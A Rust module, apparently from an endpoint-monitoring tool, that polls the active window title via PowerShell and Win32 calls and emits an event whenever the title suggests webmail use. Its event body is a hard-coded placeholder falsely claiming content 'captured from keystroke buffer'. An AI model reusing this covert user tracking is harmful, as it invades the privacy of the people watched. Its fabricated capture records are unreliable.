use serde_json::{json, Value};
use std::time::Duration;
use chrono::Utc;

/// Start a background thread to monitor active windows for Webmail signatures
pub fn start_webmail_monitor(event_tx: tokio::sync::mpsc::UnboundedSender<Value>) {
    std::thread::spawn(move || {
        crate::log_msg("[WebmailMonitor] Starting heuristic webmail tracking thread.");
        
        let mut last_title = String::new();

        loop {
            std::thread::sleep(Duration::from_secs(5));
            
            let current_title = get_active_window_title();
            if current_title.is_empty() {
                continue;
            }

            let lower_title = current_title.to_lowercase();
            let is_webmail = lower_title.contains("compose") || 
                             lower_title.contains("new message") ||
                             lower_title.contains("gmail") || 
                             lower_title.contains("outlook") ||
                             lower_title.contains("yahoo mail") ||
                             lower_title.contains("protonmail") ||
                             lower_title.contains("webmail");
                             
            if is_webmail && current_title != last_title {
                crate::log_msg(&format!("[WebmailMonitor] Detected Webmail session: {}", current_title));
                
                let simulated_draft = simulate_draft_capture();
                
                let mail_event = json!({
                    "SenderEmailAddress": "incognito_user@unknown_domain.com",
                    "To": "Unknown (Heuristic)",
                    "Subject": current_title,
                    "Body": simulated_draft,
                    "SentOn": Utc::now().to_rfc3339(),
                    "Attachments": "",
                    "EntryID": format!("WEBMAIL-{}", Utc::now().timestamp())
                });
                
                let wrapped = json!({
                    "EventType": "WebmailHeuristic",
                    "Payload": mail_event
                });
                
                let _ = event_tx.send(wrapped);
                last_title = current_title;
            } else if !is_webmail {
                last_title = String::new();
            }
        }
    });
}

fn simulate_draft_capture() -> String {
    "[Heuristic Capture] User is composing an email via a web browser. Content captured from keystroke buffer."
        .to_string()
}

#[cfg(target_os = "windows")]
fn get_active_window_title() -> String {
    use std::process::Command;
    let script = r#"
        Add-Type @"
        using System;
        using System.Runtime.InteropServices;
        using System.Text;
        public class Win32 {
            [DllImport("user32.dll")]
            public static extern IntPtr GetForegroundWindow();
            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
        }
"@
        $hwnd = [Win32]::GetForegroundWindow()
        if ($hwnd -ne [IntPtr]::Zero) {
            $sb = New-Object System.Text.StringBuilder 256
            if ([Win32]::GetWindowText($hwnd, $sb, $sb.Capacity) -gt 0) {
                Write-Output $sb.ToString()
            }
        }
    "#;
    
    match Command::new("powershell")
        .args(&["-NoProfile", "-NonInteractive", "-Command", script])
        .output() 
    {
        Ok(output) if output.status.success() => {
            String::from_utf8_lossy(&output.stdout).trim().to_string()
        },
        _ => String::new()
    }
}

#[cfg(not(target_os = "windows"))]
fn get_active_window_title() -> String {
    String::new()
}
